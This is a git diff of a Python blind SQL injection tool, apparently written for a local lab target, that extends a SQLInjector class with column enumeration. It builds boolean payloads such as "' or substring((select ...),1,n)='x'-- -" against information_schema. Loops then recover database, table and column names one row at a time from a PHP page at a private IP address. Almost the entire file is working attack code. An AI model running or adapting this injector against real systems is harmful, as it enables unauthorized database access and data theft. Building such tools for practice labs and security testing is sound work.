@@ -1,15 +1,12 @@
-import requests
 import sys
+import requests
 from enum import Enum
 
 
 class DataBaseOptions(Enum):
     databases = 0
     tables = 1
-    content = 2
-
-
-"substring((select schema_name from information_schema.schemata limit 0,1),1,1)='m'-- -"
+    colums = 2
 
 
 class SQLInjector:
@@ -38,6 +35,11 @@ class SQLInjector:
         return "select table_name from information_schema.tables where table_schema='" + \
                database + "' limit " + str(fila) + ",1"
 
+    @staticmethod
+    def __generarConsultaObtenerColumnaTabla(database: str, tabla: str, fila: int):
+        return "select column_name from information_schema.columns where table_name='" + tabla + \
+               "' and table_schema='" + database + "' limit " + str(fila) + ",1"
+
     def __generarConsultaObtenerFilaBlind(self, tipo: DataBaseOptions, columname: str,
                                           database: str, table: str, fila: int, comparador: str):
         if tipo == DataBaseOptions.databases:
@@ -47,6 +49,10 @@ class SQLInjector:
         elif tipo == DataBaseOptions.tables:
             return "' or substring((" + \
                self.__generarConsultaObtenerFilaTablas(database, fila) + \
+               "),1," + str(comparador.__len__()) + ")='" + comparador + "'-- -"
+        elif tipo == DataBaseOptions.colums:
+            return "' or substring((" + \
+               self.__generarConsultaObtenerColumnaTabla(database, table, fila) + \
                "),1," + str(comparador.__len__()) + ")='" + comparador + "'-- -"
         else:
             return "' or 1=1-- -"
@@ -93,10 +99,22 @@ class SQLInjector:
                 continuar = False
         return resultado
 
+    def buscarColumnas(self, database: str, tabla: str):
+        continuar: bool = True
+        resultado: list = []
+        posicion: int = 0
+        while continuar:
+            retorno = self.__buscar(DataBaseOptions.colums, "", database, tabla, posicion, "")
+            if retorno.__len__() > 0:
+                resultado.append(retorno)
+                posicion += 1
+            else:
+                continuar = False
+        return resultado
+
 
 inyec = SQLInjector({}, "http://192.168.0.106/sqli/example1.php?name=root")
-# print(inyec.generarConsultaObtenerFila("usuario", "FHD", "users", 0))
-# print(inyec.generarConsultaObtenerFilaBlind("schema_name", "information_schema", "schemata", 0, "i"))
-# print(inyec.buscarDatabases())
+print(inyec.buscarDatabases())
 print(inyec.buscarTablas("information_schema"))
-
+print(inyec.buscarTablas("exercises"))
+print(inyec.buscarColumnas("exercises", "users"))
